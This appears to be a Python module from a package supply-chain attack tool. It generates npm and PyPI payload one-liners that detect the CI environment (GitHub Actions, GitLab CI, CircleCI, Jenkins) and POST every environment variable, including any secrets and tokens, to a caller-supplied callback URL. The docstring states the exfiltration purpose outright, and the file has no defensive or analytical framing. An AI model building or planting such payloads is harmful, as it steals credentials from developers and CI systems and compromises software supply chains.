"""Generate runtime payloads for multiple ecosystems."""
from __future__ import annotations

import json
import os
from typing import Dict

CI_ENV_VARS = [
    "GITHUB_ACTIONS",
    "GITLAB_CI",
    "CIRCLECI",
    "JENKINS_URL",
]


def detect_ci() -> str:
    for var in CI_ENV_VARS:
        if var in os.environ:
            return var
    return "unknown"


def build_payload(registry: str, callback_url: str) -> str:
    """Return a small payload that exfiltrates environment variables."""
    ci = detect_ci()
    if registry.lower() in {"npm", "node"}:
        return (
            "const http=require('http');"\
            "const data={env:process.env,ci:'" + ci + "'};"\
            "const req=http.request('" + callback_url + "',{method:'POST',headers:{'Content-Type':'application/json'}});"\
            "req.end(JSON.stringify(data));"
        )
    if registry.lower() in {"pypi", "python"}:
        return (
            "import os,json,urllib.request;"\
            "data={'env':dict(os.environ),'ci':'" + ci + "'};"\
            "req=urllib.request.Request('" + callback_url + "',data=json.dumps(data).encode(),headers={'Content-Type':'application/json'});"\
            "urllib.request.urlopen(req)"
        )
    return "echo callback"  # default fallback
